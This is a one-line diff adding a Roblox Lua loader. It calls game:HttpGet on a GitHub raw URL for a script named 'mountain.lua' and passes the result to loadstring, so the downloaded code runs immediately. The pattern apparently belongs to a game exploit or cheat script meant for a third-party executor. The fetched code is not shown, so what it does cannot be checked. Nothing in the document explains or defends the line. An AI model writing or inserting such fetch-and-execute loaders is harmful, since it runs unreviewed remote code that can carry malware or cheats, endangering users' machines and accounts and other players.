@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Flosseyy/mountain/refs/heads/main/mountain.lua"))()
